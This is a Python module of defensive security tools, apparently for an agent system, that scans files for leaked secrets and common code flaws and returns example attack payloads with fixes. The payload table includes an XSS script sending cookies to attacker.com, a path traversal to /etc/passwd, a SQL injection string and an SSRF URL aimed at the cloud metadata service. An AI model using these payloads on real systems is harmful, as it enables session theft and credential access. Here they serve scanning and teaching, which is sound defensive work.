# security_tools.py - Hardened Security Scanners & Attack Simulators for AELVO OMEGA

import re
from pathlib import Path
from typing import Dict, Any

# --- REGEX COMPILED PATTERNS ---
SECRET_PATTERNS = {
    "AWS Access Key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "GitHub Personal Access Token": re.compile(r"\bghp_[a-zA-Z0-9]{36}\b"),
    "OpenAI API Key": re.compile(r"\bsk-[a-zA-Z0-9]{48}\b"),
    "Anthropic API Key": re.compile(r"\bsk-ant-[a-zA-Z0-9\-]{90,}\b"),
    "Google API Key": re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b"),
    "Stripe Secret Key": re.compile(r"\bsk_live_[a-zA-Z0-9]{24,}\b"),
    "Private Key Block": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    "JWT Token": re.compile(r"\beyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+"),
    "Generic Assignment Secret": re.compile(
        r"\b(secret|password|token|api_key|passwd|credential|private_key)\b\s*=\s*['\"][a-zA-Z0-9\-_]{8,128}['\"]",
        re.IGNORECASE
    )
}

def scan_for_secrets(file_path: str, workspace_root: str) -> Dict[str, Any]:
    """Scans target files for exposed API credentials, private key blocks, and JWT payloads."""
    file_p = Path(workspace_root) / file_path
    if not file_p.is_file():
        return {"status": "error", "logs": f"File '{file_path}' not found.", "executed": {}}

    findings = []
    try:
        with open(file_p, 'r', encoding='utf-8', errors='replace') as f:
            for idx, line in enumerate(f, 1):
                for name, regex in SECRET_PATTERNS.items():
                    for match in regex.finditer(line):
                        # Redact matching secrets: show first 4 and last 2 characters
                        clean_match = match.group(0).strip()
                        if len(clean_match) > 6:
                            redacted = f"{clean_match[:4]}...{clean_match[-2:]}"
                        else:
                            redacted = "***REDACTED***"
                        
                        findings.append({
                            "file": file_path,
                            "line": idx,
                            "type": name,
                            "redacted_value": redacted
                        })
        return {
            "status": "success" if not findings else "error",
            "logs": f"Secret scan found {len(findings)} exposed credential(s).",
            "executed": {"file": file_path, "secrets_found": len(findings)},
            "data": findings
        }
    except Exception as e:
        return {"status": "error", "logs": f"Secrets scan failed: {str(e)}", "executed": {}}

def scan_for_vulnerabilities(file_path: str, workspace_root: str) -> Dict[str, Any]:
    """Inspects files for typical structural syntax flaws including SQL injection, Path traversal, and XSS."""
    file_p = Path(workspace_root) / file_path
    if not file_p.is_file():
        return {"status": "error", "logs": f"File '{file_path}' not found.", "executed": {}}

    findings = []
    
    # Simple regex heuristics to capture code smells
    sqli_pattern = re.compile(r"\.execute\(\s*f?[\"'].*?\{.*?\}", re.IGNORECASE)
    sqli_concat = re.compile(r"\.execute\(\s*[\"'].*?[\"']\s*\+\s*\w+", re.IGNORECASE)
    
    path_traversal_pattern = re.compile(r"\b(?:open|Path|read_file|write_file)\(\s*(?!['\"])(\w+)", re.IGNORECASE)
    
    xss_pattern = re.compile(r"<\w+.*?\{\s*[^}]+?\s*\}.*?>", re.IGNORECASE)
    ssrf_pattern = re.compile(r"(?:requests|httpx|urllib)\.(?:get|post|request)\(\s*(?!['\"])(?:\w+|f?['\"].*?\{.*?\}).*?\)", re.IGNORECASE)

    try:
        with open(file_p, 'r', encoding='utf-8', errors='replace') as f:
            for idx, line in enumerate(f, 1):
                # 1. SQL Injection smells
                if sqli_pattern.search(line) or sqli_concat.search(line):
                    findings.append({
                        "file": file_path,
                        "line": idx,
                        "type": "SQL Injection",
                        "severity": "CRITICAL",
                        "description": "User variable interpolated directly into execute() statement. Use parameterized execution query placeholders."
                    })
                
                # 2. Path Traversal smells
                path_match = path_traversal_pattern.search(line)
                safe_iteration_var = path_match and path_match.group(1) in {"root", "__file__"}
                if path_match and not safe_iteration_var and not any(ok in line for ok in ["resolve()", "Path.cwd()", "_validate_path"]):
                    findings.append({
                        "file": file_path,
                        "line": idx,
                        "type": "Path Traversal",
                        "severity": "HIGH",
                        "description": "Raw variable passed into file operation without verification. Jailing or path sanitization needed."
                    })
                
                # 3. Cross-Site Scripting (XSS)
                if xss_pattern.search(line) and any(html in line.lower() for html in ["html", "render", "innerhtml"]):
                    findings.append({
                        "file": file_path,
                        "line": idx,
                        "type": "Cross-Site Scripting (XSS)",
                        "severity": "MEDIUM",
                        "description": "Direct interpolation of variables into HTML context. Escape or sanitize the string before rendering."
                    })
                
                # 4. Server-Side Request Forgery (SSRF)
                if ssrf_pattern.search(line):
                    findings.append({
                        "file": file_path,
                        "line": idx,
                        "type": "Server-Side Request Forgery (SSRF)",
                        "severity": "HIGH",
                        "description": "Dynamic HTTP request URL built without whitelisting domains or parsing host components."
                    })

        return {
            "status": "success" if not findings else "error",
            "logs": f"Vulnerability check found {len(findings)} structural flaw(s).",
            "executed": {"file": file_path, "flaws_found": len(findings)},
            "data": findings
        }
    except Exception as e:
        return {"status": "error", "logs": f"Vulnerability check failed: {str(e)}", "executed": {}}

def simulate_attack(vulnerability_type: str, file_path: str, vulnerable_code: str) -> Dict[str, Any]:
    """Generates educational exploit payloads and outlines remediations for identified vulnerabilities."""
    payloads = {
        "sql_injection": {
            "payload": "' OR '1'='1",
            "impact": "Bypasses queries entirely, potentially leaking authentication tables and listing arbitrary DB entries.",
            "remediation": "Replace string interpolation with query placeholders, e.g. .execute('SELECT * FROM users WHERE name = ?', (username,))"
        },
        "path_traversal": {
            "payload": "../../../../../etc/passwd",
            "impact": "Exposes files outside the target directory structure, yielding access to secure configurations, private logs, and system credentials.",
            "remediation": "Resolve absolute paths and ensure the resulting string begins with the directory jail base path."
        },
        "xss": {
            "payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            "impact": "Forces arbitrary JS execution in browser scopes, facilitating session hijacking and content spoofing.",
            "remediation": "Entity-escape dynamic data (< to &lt;, > to &gt;) or employ framework-native protection engines."
        },
        "ssrf": {
            "payload": "http://169.254.169.254/latest/meta-data/",
            "impact": "Triggers network queries targeting private internal cloud infrastructure to extract secret tokens.",
            "remediation": "Implement strict host whitelist validation checks and prevent calls to private, loopback, or broadcast subnets."
        }
    }

    vuln_key = vulnerability_type.lower().replace(" ", "_")
    details = payloads.get(vuln_key, {
        "payload": "Unknown exploit script",
        "impact": "Arbitrary security bypass and system misuse.",
        "remediation": "Refactor input handling and implement validation checks."
    })

    # Basic remediation code synthesis
    remediated = "# Remediated Code Block\n"
    if vuln_key == "sql_injection":
        remediated += "cursor.execute(\"SELECT * FROM accounts WHERE user_id = ?\", (user_input,))\n"
    elif vuln_key == "path_traversal":
        remediated += "safe_path = (Path(base_dir) / user_input).resolve()\nassert str(safe_path).startswith(str(base_dir))\n"
    elif vuln_key == "xss":
        remediated += "import html\nsafe_output = html.escape(user_input)\n"
    else:
        remediated += "# Enforce validation filters on the inputs\n"

    return {
        "status": "success",
        "logs": f"Attack simulation synthesized successfully for '{vulnerability_type}'.",
        "executed": {"vulnerability": vulnerability_type, "target": file_path},
        "data": {
            "payload": details["payload"],
            "impact": details["impact"],
            "remediation": details["remediation"],
            "remediated_code": remediated
        }
    }
